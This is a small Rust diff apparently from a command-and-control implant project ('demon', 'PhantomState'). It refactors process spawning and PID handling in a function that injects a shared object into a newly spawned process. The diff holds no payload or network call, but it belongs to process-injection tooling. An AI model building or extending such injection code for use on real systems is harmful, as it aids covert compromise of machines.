@@ -1,8 +1,7 @@
 use std::fs;
-use std::process::Stdio;
+use std::process::{Command, Stdio};
 
 use red_cell_common::demon::DemonCommand;
-use tokio::process::Command;
 
 use crate::command::PhantomState;
 use crate::command::encode::encode_u32;
@@ -320,10 +319,7 @@ async fn spawn_and_inject_so(so_bytes: &[u8]) -> u32 {
         }
     };
 
-    let Some(child_pid) = child.id() else {
-        tracing::warn!("failed to get child PID");
-        return INJECT_ERROR_FAILED;
-    };
+    let child_pid = child.id();
 
     inject_so_into_pid(child_pid, so_bytes).await
 }
